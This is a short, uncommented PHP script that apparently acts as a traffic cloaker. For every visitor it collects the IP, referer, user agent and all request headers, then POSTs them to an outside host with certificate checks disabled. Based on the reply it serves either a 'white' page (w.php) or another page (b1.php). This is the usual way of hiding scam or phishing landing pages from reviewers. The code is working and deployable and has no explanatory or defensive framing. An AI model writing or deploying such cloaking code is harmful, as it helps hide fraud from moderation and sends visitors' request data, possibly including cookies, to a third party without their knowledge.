 <?
 $post['ip'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
 $post['domain'] = $_SERVER['HTTP_HOST'];
 $post['referer'] = @$_SERVER['HTTP_REFERER'];
 $post['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
 $post['headers'] = json_encode(apache_request_headers());

 $curl = curl_init('http://sodeystwie.com/api/check_ip');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($curl, CURLOPT_TIMEOUT, 60);
 curl_setopt($curl, CURLOPT_POST, true);
 curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
 $json_reqest = curl_exec($curl);
 curl_close($curl);
 $api_reqest = json_decode($json_reqest);

 if(!@$api_reqest || @$api_reqest->white_link || @$api_reqest->result == 0){
 	require_once('w.php');
 }else{
 	require_once('b1.php');
 }?>